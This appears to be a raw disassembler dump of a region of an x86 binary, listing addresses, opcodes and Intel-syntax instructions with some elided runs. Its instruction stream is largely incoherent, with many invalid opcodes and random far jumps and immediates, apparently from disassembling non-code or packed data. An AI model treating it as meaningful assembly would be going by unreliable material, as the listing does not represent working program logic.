  427a8d:	test   DWORD PTR [eax],esi
  427a8f:	xchg   ebp,eax
  427a90:	xchg   esp,eax
  427a91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a92:	dec    edx
  427a93:	arpl   WORD PTR [eax],ax
  427a95:	adc    al,0xad
  427a97:	inc    ebp
  427a98:	adc    al,0x98
  427a9a:	das    
  427a9b:	les    ebx,FWORD PTR [edi]
  427a9d:	xchg   edx,eax
  427a9e:	sbb    BYTE PTR [ecx-0x48],0xac
  427aa2:	jl     0x427aa4
  427aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427aa5:	mov    al,0x51
  427aa7:	mov    dh,BYTE PTR [edx]
  427aa9:	mov    cl,0x34
  427aab:	and    al,0xd6
  427aad:	(bad)  
  427aae:	neg    BYTE PTR [esi+0x57daa3c7]
  427ab4:	int3   
  427ab5:	xor    eax,0xa15af958
  427aba:	mov    ah,0xeb
  427abc:	aas    
  427abd:	push   edx
  427abe:	xchg   ebx,eax
  427abf:	inc    ecx
  427ac0:	dec    BYTE PTR [edi]
  427ac2:	out    dx,eax
  427ac3:	sbb    al,0xb5
  427ac5:	or     eax,0x3dbc0738
  427aca:	push   edi
  427acb:	sbb    BYTE PTR [edx+eax*1+0x72ed2d71],0x28
  427ad3:	inc    ebx
  427ad4:	jno    0x427acb
  427ad6:	add    edi,DWORD PTR [ebx]
  427ad8:	mov    al,ds:0x1f208e85
  427add:	xlat   BYTE PTR ds:[ebx]
  427ade:	mov    ecx,0xea2a58e8
  427ae3:	jbe    0x427a6b
  427ae5:	jb     0x427ab3
  427ae7:	(bad)  
  427ae8:	push   eax
  427ae9:	pop    esi
  427aea:	shl    DWORD PTR [edx],cl
  427aec:	dec    ebp
  427aed:	adc    ah,BYTE PTR [edi]
  427aef:	cli    
  427af0:	(bad)  
  427af1:	jmp    0xc66d:0xb096f981
  427af8:	sahf   
  427af9:	arpl   WORD PTR [eax-0x762b259d],di
  427aff:	jbe    0x427b63
  427b01:	(bad)  
  427b03:	jmp    DWORD PTR [esi-0x65]
  427b06:	jle    0x427b2e
  427b08:	std    
  427b09:	mov    ds:0x19514901,al
  427b0e:	and    esi,DWORD PTR [esi-0x61]
	...
  427b71:	add    BYTE PTR [eax],al
  427b73:	add    dl,cl
  427b75:	mov    edx,DWORD PTR [edx+0x7b]
  427b78:	push   ebx
  427b79:	sti    
  427b7a:	jmp    0x427b37
  427b7c:	push   ecx
  427b7d:	mov    ecx,ebx
  427b7f:	test   BYTE PTR [ecx-0x4dcb4c3],0xa8
  427b86:	add    DWORD PTR [eax],eax
  427b88:	add    eax,0xc1000001
  427b8d:	mov    edx,0x8de880af
  427b92:	shl    DWORD PTR [edx+edi*4-0x79672717],cl
  427b99:	(bad)  
  427b9a:	jb     0x427bdb
  427b9c:	aaa    
  427b9d:	repz push 0xd2d4c6ba
  427ba3:	sti    
  427ba4:	mov    dh,0xce
  427ba6:	add    eax,0x7dbbd314
  427bab:	test   esi,ecx
  427bad:	jb     0x427b7c
  427baf:	shl    DWORD PTR [esi],cl
  427bb1:	aaa    
  427bb2:	cmp    DWORD PTR [edi],esp
  427bb4:	jl     0x427b5b
  427bb6:	out    0xf6,al
  427bb8:	sub    ch,BYTE PTR ds:0xae800732
  427bbe:	or     bh,BYTE PTR [esi-0x75]
  427bc1:	push   esp
  427bc2:	mov    dh,0xee
  427bc4:	mul    BYTE PTR [ebx]
  427bc6:	fnsave [edi]
  427bc8:	je     0x427ba9
  427bca:	mov    edx,0x16001bae
  427bcf:	aam    0x2e
  427bd1:	sub    edi,esp
  427bd3:	in     eax,dx
  427bd4:	jg     0x427c22
  427bd6:	mov    ch,0xd
  427bd8:	xchg   edx,eax
  427bd9:	inc    ebx
  427bda:	or     ecx,esi
  427bdc:	push   edx
  427bdd:	lods   al,BYTE PTR ds:[esi]
  427bde:	and    BYTE PTR [ecx+0x578b2a36],bh
  427be4:	mov    ch,cl
  427be6:	(bad)  
  427be7:	mov    eax,ds:0x5a504b28
  427bec:	sbb    esp,ebx
  427bee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bef:	cmp    DWORD PTR [edx-0x6a],0xd1f955d8
  427bf6:	mov    ch,0x32
  427bf8:	ins    DWORD PTR es:[edi],dx
  427bf9:	int    0x4
  427bfb:	ins    BYTE PTR es:[edi],dx
  427bfc:	fs lahf 
  427bfe:	pop    esp
  427bff:	push   ecx
  427c00:	loop   0x427c0f
  427c02:	cmp    dl,dh
  427c04:	add    DWORD PTR [edi+0x4c5424e8],eax
  427c0a:	stos   BYTE PTR es:[edi],al
  427c0b:	stc    
  427c0c:	lock loop 0x427bf8
  427c0f:	loope  0x427c16
  427c11:	ror    BYTE PTR [ebx+edx*1+0x146ce107],0xb1
  427c19:	sbb    al,0x2
  427c1b:	fs cmp eax,0x4bc00af1
  427c21:	jns    0x427c28
  427c23:	cmp    eax,0x7d8b790d
  427c28:	ja     0x427c29
  427c2a:	sub    ah,BYTE PTR [eax+edi*8+0x6df62333]
  427c31:	daa    
  427c32:	sahf   
  427c33:	inc    edx
  427c34:	rcr    BYTE PTR [ebx],1
  427c36:	push   ss
  427c37:	stos   DWORD PTR es:[edi],eax
  427c38:	test   BYTE PTR [esi-0x74dc6b7e],ch
  427c3e:	dec    esp
  427c3f:	fsubr  st,st(3)
  427c41:	jle    0x427c62
  427c43:	add    esi,DWORD PTR [eax+0x7865e43c]
  427c49:	or     DWORD PTR [edx-0x5acc9222],esi
  427c4f:	mov    ecx,0x9406a224
  427c54:	lods   eax,DWORD PTR ds:[esi]
  427c55:	mov    al,ds:0xd3edf2fa
  427c5a:	inc    ebx
  427c5b:	mov    BYTE PTR [esi+0x62a138f3],ch
  427c61:	rcl    bh,1
  427c63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c64:	or     bh,BYTE PTR [edx+0xbe97dd5]
  427c6a:	aas    
  427c6b:	(bad)  ds:0x228e295
  427c71:	out    dx,eax
  427c72:	dec    DWORD PTR [esp+ecx*8]
  427c75:	push   0x3dbbec8a
  427c7a:	xchg   esi,eax
  427c7b:	fiadd  WORD PTR [eax+ecx*4+0x6f]
  427c7f:	add    ah,BYTE PTR [esi-0x1c]
  427c82:	inc    edx
  427c83:	data16 or BYTE PTR [eax-0xe5f1766],bl
  427c8a:	dec    eax
  427c8b:	pusha  
  427c8c:	cli    
  427c8d:	mov    eax,0x9904ee
	...
  427cf2:	add    BYTE PTR [eax],al
  427cf4:	mov    ds:0xf343b050,eax
  427cf9:	jecxz  0x427cee
  427cfb:	lock xchg DWORD PTR ds:0x29ce5d44,ebx
  427d02:	dec    esp
  427d03:	dec    esp
  427d04:	add    BYTE PTR [edx+0x1050001],ch
  427d0a:	add    BYTE PTR [eax],al
  427d0c:	rsm    
  427d0e:	mov    bl,0x62
  427d10:	push   ecx
  427d11:	lds    esi,FWORD PTR [edx-0x7051410d]
  427d17:	arpl   WORD PTR [ebp+ebx*4+0x58d96639],dx
  427d1e:	mov    ebx,0x58ebda1f
  427d23:	cmpxchg dl,bh
  427d26:	addr16 aam 0x6d
  427d29:	adc    edi,ebx
  427d2b:	mov    bl,0xc7
  427d2d:	sldt   WORD PTR [esi+0x1f]
  427d31:	scas   eax,DWORD PTR es:[edi]
  427d32:	mov    ecx,DWORD PTR [ebx+0x3cfbf58f]
  427d38:	(bad)  
  427d39:	mov    edi,0xc1a3d3c3
  427d3e:	cmp    eax,0x2872a840
  427d43:	popf   
  427d44:	adc    dl,BYTE PTR [ebx+0xf]
  427d47:	inc    eax
  427d48:	(bad)  
  427d4a:	xchg   esp,eax
  427d4b:	push   esp
  427d4c:	les    edi,FWORD PTR [esi+0x6b]
  427d4f:	inc    ecx
  427d50:	in     al,dx
  427d51:	call   0x5d6b:0x6f6164c4
  427d58:	or     ebp,edx
  427d5a:	aad    0x98
  427d5c:	and    al,0x46
  427d5e:	pop    ecx
  427d5f:	jnp    0x427d54
  427d61:	lahf   
  427d62:	jns    0x427d6e
  427d64:	push   es
  427d65:	lds    ebx,FWORD PTR [edi]
  427d67:	inc    edi
  427d68:	mov    edx,0x7f977e90
  427d6d:	imul   edi,DWORD PTR ds:0xbfd50800,0x924efb40
  427d77:	or     al,0x75
  427d79:	daa    
  427d7a:	lahf   
  427d7b:	xor    BYTE PTR [edi+0x39],dl
  427d7e:	rcr    BYTE PTR [esi-0x30],1
  427d81:	das    
  427d82:	test   eax,0x9660a477
  427d87:	or     eax,0xb78d714b
  427d8c:	jl     0x427d1c
  427d8e:	jnp    0x427d9b
  427d90:	test   DWORD PTR [ebx],edx
  427d92:	inc    ebp
  427d93:	jmp    0xb641ac94
  427d98:	(bad)  
  427d99:	ss fild DWORD PTR gs:[ebx]
  427d9d:	or     eax,0xb1ea5c6f
  427da2:	push   edi
  427da3:	xchg   edx,eax
  427da4:	clc    
  427da5:	out    0x64,eax
  427da7:	inc    edx
  427da8:	xor    al,0xaf
  427daa:	arpl   WORD PTR [esi-0x4b],bx
  427dad:	xchg   DWORD PTR [eax-0x386a11c6],esp
  427db3:	int    0x40
  427db5:	daa    
  427db6:	mov    edi,0x3598c699
  427dbb:	fld    QWORD PTR [edx+0x77]
  427dbe:	adc    edi,ecx
  427dc0:	test   DWORD PTR ds:0xf5aa7a63,ebx
  427dc6:	mov    ah,0xd0
  427dc8:	outs   dx,DWORD PTR ds:[esi]
  427dc9:	push   0xffffffd9
  427dcb:	adc    eax,0xff103690
  427dd0:	(bad)  
  427dd1:	push   dx
  427dd3:	stos   BYTE PTR es:[edi],al
  427dd4:	push   edi
  427dd5:	jecxz  0x427dd5
  427dd7:	test   DWORD PTR [esi-0x5f],edi
  427dda:	mov    BYTE PTR [ecx+0x1a069a3b],bh
  427de0:	stc    
  427de1:	test   DWORD PTR [eax-0x195c1c4e],esp
  427de7:	iret   
  427de8:	mov    ds:0x25988399,al
  427ded:	pop    ecx
  427dee:	dec    eax
  427def:	add    ah,BYTE PTR [edx]
  427df1:	jg     0x427dfc
  427df3:	call   0xdaf5:0xa7408e2c
  427dfa:	outs   dx,DWORD PTR ds:[esi]
  427dfb:	push   ds
  427dfc:	fild   WORD PTR [ebx+0x7c]
  427dff:	mov    ebp,0x4f0e26c2
  427e04:	pop    eax
  427e05:	fs inc edi
  427e07:	ins    BYTE PTR es:[edi],dx
  427e08:	popf   
  427e09:	std    
  427e0a:	xchg   esp,eax
  427e0b:	and    bl,BYTE PTR [ebp+0x7e0325c2]
	...
  427e71:	add    BYTE PTR [eax],al
  427e73:	add    BYTE PTR [eax+0x6d3c25f1],bh
  427e79:	cld    
  427e7a:	mov    ecx,0x2bc293f5
  427e7f:	leave  
  427e80:	mov    ah,0x39
  427e82:	add    al,0x74
  427e84:	add    eax,0x50001ab
  427e89:	add    DWORD PTR [eax],eax
  427e8b:	add    al,ch
  427e8d:	jle    0x427ec9
  427e8f:	jmp    0xa347:0x81346e30
  427e96:	mov    eax,ds:0x936f2a46
  427e9b:	(bad)  
  427e9d:	push   cs
  427e9e:	adc    eax,0xa6d809e7
  427ea3:	int    0x6e
  427ea5:	sbb    cl,BYTE PTR [ecx]
  427ea7:	add    edx,DWORD PTR [esi]
  427ea9:	adc    al,BYTE PTR [ebp+0x396a8543]
  427eaf:	jg     0x427e3d
  427eb1:	xor    eax,0x53face4f
  427eb6:	cdq    
  427eb7:	and    ch,dl
  427eb9:	out    dx,eax
  427eba:	lahf   
  427ebb:	cdq    
  427ebc:	jg     0x427e9b
  427ebe:	paddd  mm3,QWORD PTR [esi+ebp*8]
  427ec2:	shl    ch,1
  427ec4:	popa   
  427ec5:	xchg   DWORD PTR [edx+0x7f],esp
  427ec8:	mov    eax,ecx
  427eca:	sub    eax,0x5605ecb
  427ecf:	mov    ds:0xa8d53532,al
  427ed4:	jbe    0x427ed4
  427ed6:	inc    ecx
  427ed7:	pop    es
  427ed8:	dec    esp
  427ed9:	ss push esp
  427edb:	mov    edi,DWORD PTR [ebx]
  427edd:	test   eax,0x611ca002
  427ee2:	adc    BYTE PTR [ebp+0x3f],0xa8
  427ee6:	mov    dh,0x2f
  427ee8:	adc    DWORD PTR [eax],ebx
  427eea:	mov    ds:0x5f28555e,eax
  427eef:	arpl   WORD PTR [ecx-0x1f45515e],sp
  427ef5:	lods   al,BYTE PTR ds:[esi]
  427ef6:	fisttp QWORD PTR [ecx+esi*8+0xb]
  427efa:	dec    esp
  427efb:	xchg   BYTE PTR [edx],bl
  427efd:	pop    esp
  427efe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427eff:	js     0x427f32
  427f01:	pop    es
  427f02:	xchg   esp,eax
  427f03:	or     DWORD PTR [edi-0x71],0x6
  427f07:	mov    bl,0xe0
  427f09:	scas   al,BYTE PTR es:[edi]
  427f0a:	dec    ebx
  427f0b:	inc    ebp
  427f0c:	sti    
  427f0d:	data16 xor BYTE PTR [esp+edx*1-0x28c73b76],bl
  427f15:	add    dh,BYTE PTR [esp+ebx*4+0x4c5bfa17]
  427f1c:	mov    WORD PTR [edi+0x38],cs
  427f1f:	not    BYTE PTR [edx-0x7a5fdedc]
  427f25:	pop    esi
  427f26:	mov    ds,WORD PTR [edi]
  427f28:	aaa    
  427f29:	add    edi,DWORD PTR [ebp-0x7acfe881]
  427f2f:	ja     0x427f37
  427f31:	push   esp
  427f32:	pop    ss
  427f33:	add    edi,DWORD PTR [esi]
  427f35:	cmp    ch,0x49
  427f38:	jo     0x427f11
  427f3a:	cmp    eax,DWORD PTR [ebx+ebp*2]
  427f3d:	je     0x427f0a
  427f3f:	nop
  427f40:	sbb    DWORD PTR [ebx+eax*8],ecx
  427f43:	adc    BYTE PTR ds:0x4b024fb6,al
  427f49:	test   BYTE PTR [eax+0x76237a2d],al
  427f4f:	push   0xffffffe1
  427f51:	push   es
  427f52:	fld    QWORD PTR [eax-0x1b9084eb]
  427f58:	push   ss
  427f59:	scas   al,BYTE PTR es:[edi]
  427f5a:	imul   ebp,DWORD PTR [ecx],0xef9832ce
  427f60:	adc    dh,BYTE PTR [edi-0x71]
  427f63:	pop    eax
  427f64:	repnz mov WORD PTR [eax],cs
  427f67:	mov    bh,dl
  427f69:	ss enter 0x7923,0x61
  427f6e:	dec    edx
  427f6f:	xchg   ecx,eax
  427f70:	xor    ecx,DWORD PTR [ebp-0x3a]
  427f73:	xor    al,cl
  427f75:	xchg   ebx,eax
  427f76:	ins    BYTE PTR es:[edi],dx
  427f77:	or     al,0xe3
  427f79:	in     al,0x6e
  427f7b:	leave  
  427f7c:	pop    ebx
  427f7d:	xchg   ecx,eax
  427f7e:	fimul  WORD PTR [edx+0x6ffa43c3]
  427f84:	in     al,dx
  427f85:	retf   
  427f86:	inc    eax
  427f87:	jne    0x427f4b
  427f89:	and    ebp,DWORD PTR [edx+0xc9a35af]
  427f8f:	stc    
  427f90:	dec    ecx
	...
  427ff1:	add    BYTE PTR [eax],al
  427ff3:	add    BYTE PTR [ecx+0x5f2f4ba7],dh
  427ff9:	out    dx,eax
  427ffa:	cmc    
  427ffb:	mov    edi,0x22b0803f
  428000:	ins    DWORD PTR es:[edi],dx
  428001:	jmp    0x1:0xac0a346d
  428008:	add    eax,0x72000001
  42800d:	mov    ecx,DWORD PTR [esi]
  42800f:	loope  0x427fb4
  428011:	and    edx,DWORD PTR [edi-0x6d]
  428014:	pop    edx
  428015:	dec    edi
  428016:	nop
  428017:	push   cs
  428018:	sub    edi,edi
  42801a:	or     BYTE PTR [ebx-0x671a533],cl
  428020:	adc    ebp,ebx
  428022:	pop    ss
  428023:	nop
  428024:	sub    BYTE PTR ds:0x1cceb561,bl
  42802a:	xchg   ecx,eax
  42802b:	inc    ebp
  42802c:	or     cl,BYTE PTR [ebx-0xa737816]
  428032:	jg     0x428030
  428034:	sub    DWORD PTR [esi+0x2],edx
  428037:	test   al,0x98
  428039:	call   FWORD PTR [ebx]
  42803b:	sbb    ebx,DWORD PTR [eax-0x7202659]
  428041:	mov    ah,0x5d
  428043:	mov    eax,0xf41cdbee
  428048:	dec    ecx
  428049:	jo     0x42803d
  42804b:	ss cdq 
  42804d:	icebp  
  42804e:	or     esp,DWORD PTR cs:[edi]
  428051:	ret    0x299b
  428054:	jmp    0x428098
  428056:	aam    0x79
  428058:	push   ss
  428059:	bound  ebx,QWORD PTR [ecx-0x72c9e4a1]
  42805f:	lods   eax,DWORD PTR ds:[esi]
  428060:	(bad)  [edi+0x2aa40e36]
  428066:	je     0x4280db
  428068:	and    ah,BYTE PTR [esi]
  42806a:	ret    0x312b
  42806d:	mov    eax,0x30fb76e6
  428072:	out    dx,al
  428073:	out    dx,eax
  428074:	mov    bl,0xf7
  428076:	(bad)  
  428077:	out    dx,al
  428078:	add    al,0x8d
  42807a:	sbb    BYTE PTR [eax-0x63],al
  42807d:	push   edi
  42807e:	add    BYTE PTR [ecx-0x53],dh
  428081:	stc    
  428082:	enter  0x9f7d,0xee
  428086:	pop    ebx
  428087:	je     0x4280af
  428089:	out    dx,al
  42808a:	sub    DWORD PTR [edi-0x687795d9],edi
  428090:	call   edx
  428092:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428093:	aaa    
  428094:	cmp    al,0x2d
  428096:	sahf   
  428097:	add    BYTE PTR [eax-0x5605f285],bh
  42809d:	repz xor BYTE PTR ds:0x2c26ea,cl
  4280a4:	lods   al,BYTE PTR ds:[esi]
  4280a5:	mov    edx,0xd23c0ad1
  4280aa:	xor    DWORD PTR ds:0x5aac95f1,0x48e73839
  4280b4:	push   ebx
  4280b5:	adc    bh,bl
  4280b7:	cmp    al,0x37
  4280b9:	outs   dx,DWORD PTR ds:[esi]
  4280ba:	or     eax,0x2d4c2d5b
  4280bf:	jp     0x428058
  4280c1:	imul   edx,esp,0x8da1b405
  4280c7:	mov    eax,ds:0xb8645b4e
  4280cc:	lds    ebx,FWORD PTR [ecx-0x47e078c7]
  4280d2:	lods   eax,DWORD PTR ds:[esi]
  4280d3:	mov    dh,0x38
  4280d5:	mov    ch,0x9a
  4280d7:	pusha  
  4280d8:	jmp    0x428123
  4280da:	out    dx,al
  4280db:	pop    eax
  4280dc:	xor    BYTE PTR [esi],al
  4280de:	cdq    
  4280df:	sub    dl,BYTE PTR [edx+0x6acdd95a]
  4280e5:	pop    eax
  4280e6:	add    BYTE PTR [eax-0x1e5076cc],dl
  4280ec:	add    DWORD PTR [edi-0x72],esi
  4280ef:	xor    BYTE PTR [ebp-0x43],dl
  4280f2:	mul    DWORD PTR [eax-0x444d5e1e]
  4280f8:	int3   
  4280f9:	jecxz  0x4280fd
  4280fb:	cld    
  4280fc:	or     eax,0x8e91f9f1
  428101:	xor    dl,BYTE PTR [esi+edi*4-0x10fed71e]
  428108:	mov    esp,gs
  42810a:	inc    edx
  42810b:	mov    eax,ds:0xb5687ad0
  428110:	fiadd  WORD PTR [eax]
	...
  428172:	add    BYTE PTR [eax],al
  428174:	fucomip st,st(6)
  428176:	std    
  428177:	dec    esp
  428178:	std    
  428179:	pop    edi
  42817a:	(bad)  
  42817b:	call   FWORD PTR [edx]
  42817d:	xchg   edi,eax
  42817e:	pop    esp
  42817f:	push   ecx
  428180:	adc    eax,0xfb631c8
  428185:	lods   eax,DWORD PTR ds:[esi]
  428186:	add    DWORD PTR [eax],eax
  428188:	add    eax,0xca000001
  42818d:	test   eax,0xd5be6481
  428192:	aam    0xce
  428194:	loope  0x428149
  428196:	loope  0x428160
  428198:	mov    al,ds:0xb07ffd14
  42819d:	(bad)  
  42819e:	add    BYTE PTR [esi+esi*8],cl
  4281a1:	xchg   BYTE PTR [edx+eiz*2-0x12],dl
  4281a5:	sahf   
  4281a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4281a7:	push   ss
  4281a8:	lds    esi,FWORD PTR [ebx+0x61b919c3]
  4281ae:	sub    al,ch
  4281b0:	mov    bl,cl
  4281b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4281b3:	enter  0x2e6e,0x98
  4281b7:	aam    0xe8
  4281b9:	icebp  
  4281ba:	rcl    DWORD PTR [ebp-0x41d9818e],0x2b
  4281c1:	cmp    eax,0x4a9cb7a0
  4281c6:	cmp    BYTE PTR [ecx-0x41],cl
  4281c9:	mov    esi,0xbeb8559a
  4281ce:	mov    WORD PTR [edx],fs
  4281d0:	xor    ecx,ebp
  4281d2:	outs   dx,BYTE PTR ds:[esi]
  4281d3:	out    0xa5,eax
  4281d5:	(bad)  
  4281d6:	pop    ebp
  4281d7:	pop    edx
  4281d8:	mov    esi,0xe6742722
  4281dd:	xchg   edx,eax
  4281de:	enter  0x4a51,0x56
  4281e2:	inc    eax
  4281e3:	ret    
  4281e4:	inc    esi
  4281e5:	xchg   DWORD PTR [esi+0x37],esi
  4281e8:	xchg   ebx,eax
  4281e9:	inc    esp
  4281ea:	nop
  4281eb:	clc    
  4281ec:	xchg   DWORD PTR ds:0x9ea9845d,eax
  4281f2:	(bad)  [edi+edx*8-0xd3b75f6]
  4281f9:	imul   eax,DWORD PTR [ebx],0x76d5b4d8
  4281ff:	dec    edx
  428200:	push   ss
  428201:	loopne 0x428281
  428203:	push   0x3629f247
  428208:	dec    ebx
  428209:	rol    eax,1
  42820b:	jns    0x428202
  42820d:	stos   BYTE PTR es:[edi],al
  42820e:	or     DWORD PTR [ebx+eax*1-0x6c],0x6e
  428213:	sub    eax,0x94d9fd71
  428218:	ins    DWORD PTR es:[edi],dx
  428219:	adc    DWORD PTR [edx-0x1063a56f],ebx
  42821f:	adc    DWORD PTR ds:0xd0ad8f25,ecx
  428225:	int3   
  428226:	imul   BYTE PTR [esi+0x7e16a745]
  42822c:	mov    bl,0xa0
  42822e:	addr16 clc 
  428230:	call   0xb723:0x7c790c57
  428237:	cmp    al,0x8d
  428239:	dec    ebx
  42823a:	jge    0x4281ec
  42823c:	sbb    esp,ebp
  42823e:	mov    ds:0x75b88e2c,al
  428243:	mov    edi,0x597b0870
  428248:	mov    ecx,0x92e02d
  42824d:	mov    BYTE PTR [eax+edx*8],dl
  428250:	retf   
  428251:	in     eax,dx
  428252:	mov    ecx,0x7ca48beb
  428257:	xchg   esi,eax
  428258:	adc    BYTE PTR [eax-0x2d],al
  42825b:	mov    al,ds:0x9de2e520
  428260:	fdiv   st,st(1)
  428262:	jmp    0x78c8:0x81860aa2
  428269:	mov    ds:0xff5844da,al
  42826e:	sbb    DWORD PTR [edi],eax
  428270:	fidiv  DWORD PTR [ecx+ebp*1]
  428273:	aam    0x58
  428275:	xchg   esi,eax
  428276:	adc    dl,BYTE PTR [eax-0x37d23de4]
  42827c:	pop    edi
  42827d:	cmp    dl,BYTE PTR [edi+0x4a]
  428280:	lock push ebx
  428282:	push   edx
  428283:	xlat   BYTE PTR ds:[ebx]
  428284:	adc    DWORD PTR [ecx],ebx
  428286:	mov    dl,0x58
  428288:	push   cs
  428289:	add    DWORD PTR [edx-0x5a],edx
  42828c:	enter  0x56d2,0xda
  428290:	xor    eax,DWORD PTR [eax]
	...
  4282f2:	add    BYTE PTR [eax],al
  4282f4:	(bad)  
  4282f5:	fidiv  WORD PTR [esi]
  4282f7:	loop   0x428338
  4282f9:	jmp    0x5c37:0x7b70ffd7
  428300:	inc    ecx
  428301:	push   eax
  428302:	(bad)  
  428304:	adc    al,0xae
  428306:	add    DWORD PTR [eax],eax
  428308:	add    eax,0x26000001
  42830d:	xor    DWORD PTR [eax+ebx*2+0x2f3a41cf],0x7e
  428315:	mov    WORD PTR [eax],?
  428317:	or     BYTE PTR [edi+0x37952f78],al
  42831d:	pop    ss
  42831e:	or     ebx,DWORD PTR [ebx]
  428320:	das    
  428321:	sbb    BYTE PTR [edx-0x143b43c],dl
  428327:	out    0x83,al
  428329:	and    eax,0x5ef33d06
  42832e:	retf   0x5c47
  428331:	addr16 push esp
  428333:	push   0x77f16aaf
  428338:	add    al,0xa9
  42833a:	sbb    ah,bh
  42833c:	mov    al,ds:0x2874783d
  428341:	mov    DWORD PTR [ebx+0x70],esp
  428344:	or     esi,edi
  428346:	sbb    cl,cl
  428348:	inc    edi
  428349:	xchg   BYTE PTR [ebp-0x6db613e9],bh
  42834f:	pop    eax
  428350:	mov    bl,0xc5
  428352:	mov    dl,0x12
  428354:	push   esp
  428355:	pop    ecx
  428356:	retf   0xf21b
  428359:	mov    ecx,esi
  42835b:	dec    edx
  42835c:	adc    eax,esp
  42835e:	mov    ah,dh
  428360:	cmp    eax,0xa31eaae7
  428365:	call   0xf9ebf577
  42836a:	sub    BYTE PTR ds:[eax+eiz*2+0x6],0x14
  428370:	fstp   TBYTE PTR ds:0x3a9b5a18
  428376:	in     eax,dx
  428377:	pushf  
  428378:	mov    ebp,0xbb85bbc8
  42837d:	int3   
  42837e:	(bad)  
  428380:	pop    ss
  428381:	pusha  
  428382:	and    dh,BYTE PTR [edi]
  428384:	jne    0x4283d3
  428386:	mov    dl,0xc1
  428388:	jb     0x428325
  42838a:	dec    edx
  42838b:	test   eax,0xdc96e1a1
  428390:	loopne 0x428334
  428392:	push   ecx
  428393:	int3   
  428394:	or     bh,dl
  428396:	mov    ecx,0xe2deed90
  42839b:	mov    eax,ds:0xe0545896
  4283a0:	xor    ch,bh
  4283a2:	shr    DWORD PTR [edi],1
  4283a4:	shl    BYTE PTR es:[ecx+0x7d],1
  4283a8:	mov    ebx,0xcb498a6f
  4283ad:	cs pop esi
  4283af:	scas   eax,DWORD PTR es:[edi]
  4283b0:	xchg   ecx,eax
  4283b1:	jle    0x4283d7
  4283b3:	push   ecx
  4283b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4283b5:	sbb    edx,edx
  4283b7:	sub    eax,0x66403e36
  4283bc:	test   al,0x88
  4283be:	and    al,BYTE PTR [esi-0x239c6d15]
  4283c4:	mov    bh,0xc2
  4283c6:	xor    DWORD PTR ds:0x38f7962a,ebx
  4283cc:	scas   eax,DWORD PTR es:[edi]
  4283cd:	and    ecx,DWORD PTR [edx-0x4257c8f6]
  4283d3:	mov    ah,0x4b
  4283d5:	pop    ss
  4283d6:	repnz cmp al,0xb8
  4283d9:	jmp    0xb49a:0x6324cba6
  4283e0:	inc    eax
  4283e1:	cmp    ecx,DWORD PTR [ecx+0x3eb4e83c]
  4283e7:	outs   dx,BYTE PTR ds:[esi]
  4283e8:	or     DWORD PTR [ebp-0x3653373e],esp
  4283ee:	into   
  4283ef:	aad    0x13
  4283f1:	xor    eax,0x74c6c600
  4283f6:	je     0x428477
  4283f8:	scas   al,BYTE PTR es:[edi]
  4283f9:	fcom   QWORD PTR [ecx]
  4283fb:	je     0x428401
  4283fd:	sub    eax,0x7c0e2ff
  428402:	inc    eax
  428403:	popa   
  428404:	add    dl,ah
  428406:	test   cl,bl
  428408:	test   BYTE PTR [ebp-0x68],dl
  42840b:	(bad)  
  42840c:	push   esi
  42840d:	and    al,0x7f
  42840f:	jb     0x428466
	...
  428471:	add    BYTE PTR [eax],al
  428473:	add    BYTE PTR [esi],cl
  428475:	xchg   esp,eax
  428476:	jg     0x4284db
  428478:	(bad)  
  428479:	jmp    0x428499
  42847b:	std    
  42847c:	mov    edi,0xe3abfb32
  428481:	xor    al,0xf9
  428483:	or     ebx,DWORD PTR [ecx]
  428485:	scas   eax,DWORD PTR es:[edi]
  428486:	add    DWORD PTR [eax],eax
  428488:	add    eax,0x2000001
  42848d:	ret    0xd49b
  428490:	retf   0xe011
  428493:	jecxz  0x42844d
  428495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428496:	mov    ds:0xf669e246,eax
  42849b:	mov    ah,0x16
  42849d:	pop    ecx
  42849e:	nop
  42849f:	add    DWORD PTR [ebp-0x14],edx
  4284a2:	cmp    ebx,DWORD PTR [ebx]
  4284a4:	std    
  4284a5:	mov    eax,ebx
  4284a7:	leave  
  4284a8:	adc    ch,0x38
  4284ab:	push   0x5e
  4284ad:	pop    ebp
  4284ae:	femms  
  4284b0:	repz shl DWORD PTR [edi+0x7aaf806b],cl
  4284b7:	add    BYTE PTR [eax+edx*1-0x2],bh
  4284bb:	sbb    BYTE PTR [edi],0x7b
  4284be:	sti    
  4284bf:	inc    esp
  4284c0:	aad    0x8d
  4284c2:	fstp   DWORD PTR [edi+0x48775914]
  4284c8:	xor    eax,0xb8500830
  4284cd:	jmp    0xf7fa4e07
  4284d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4284d3:	mov    al,0x4c
  4284d5:	div    DWORD PTR [esi-0x5552c0b3]
  4284db:	mov    ds:0xa9386328,eax
  4284e0:	push   es
  4284e1:	test   DWORD PTR [eax],esp
  4284e3:	push   cs
  4284e4:	push   0x5
  4284e6:	jmp    0x61da:0xb60250fc
  4284ed:	(bad)  
  4284ee:	(bad)  
  4284ef:	out    dx,eax
  4284f0:	dec    ebx
  4284f1:	nop
  4284f2:	leave  
  4284f3:	jb     0x4284f5
  4284f5:	pusha  
  4284f6:	pop    eax
  4284f7:	push   edi
  4284f8:	fstp   QWORD PTR ds:0x7edcaab1
  4284fe:	dec    ecx
  4284ff:	jp     0x428502
  428501:	(bad)  
  428502:	dec    esi
  428503:	in     al,0x89
  428505:	(bad)  
  428506:	data16 sbb BYTE PTR [ecx],ah
  428509:	inc    ebp
  42850a:	inc    ecx
  42850b:	jmp    0x428584
  42850d:	sub    esi,DWORD PTR [edx]
  42850f:	add    esp,DWORD PTR [edx-0x37]
  428512:	popa   
  428513:	dec    eax
  428514:	lods   al,BYTE PTR ds:[esi]
  428515:	mov    cl,0xa3
  428517:	lods   al,BYTE PTR ds:[esi]
  428518:	(bad)  
  42851a:	mov    al,0x1d
  42851c:	sub    cl,BYTE PTR [ecx*4+0x188a9b3f]
  428523:	mov    esp,ebp
